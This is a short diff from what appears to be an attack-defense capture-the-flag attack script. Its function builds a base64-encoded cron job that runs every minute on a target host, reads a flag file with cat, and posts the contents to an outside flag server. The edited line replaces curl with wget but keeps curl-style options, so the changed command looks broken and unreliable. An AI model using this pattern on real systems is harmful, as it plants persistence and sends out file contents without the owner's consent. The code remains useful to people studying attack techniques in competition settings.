@@ -266,7 +266,7 @@ def crontab_flag_ip(target,target_port,cmd):
     return cmd
 
 def crontab_flag_submit(target,target_port,cmd):
-    cmd = '/usr/bin/curl "http://%s:%s/%s" -d "token=%s&flag=$(/bin/cat %s)"' %(flag_server,flag_port,flag_url,flag_token,flag_path)
+    cmd = '/usr/bin/wget "http://%s:%s/%s" -d "token=%s&flag=$(/bin/cat %s)" -H "Cookie:%s"' %(flag_server,flag_port,flag_url,flag_token,flag_path,flag_cookie)
     crontab_cmd = "* * * * * %s\n"%cmd
     encode_crontab_cmd = base64.b64encode(crontab_cmd)
     cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp.conf" + " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
